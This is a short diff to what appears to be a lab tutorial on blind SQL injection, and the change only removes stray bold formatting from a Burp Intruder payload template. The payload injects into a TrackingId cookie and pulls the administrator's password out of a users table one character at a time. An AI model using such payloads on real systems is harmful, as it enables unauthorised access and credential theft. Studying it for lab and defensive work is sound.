@@ -412,7 +412,7 @@ Instead:
 You get:
 
 ```
-TrackingId=xyz' AND (SELECT SUBSTRING(password,**§**1**§**,1) FROM users WHERE username='administrator')='**§**a**§**'--
+TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
 
 ```
 The `§...§` markers tell Intruder where to insert payloads.
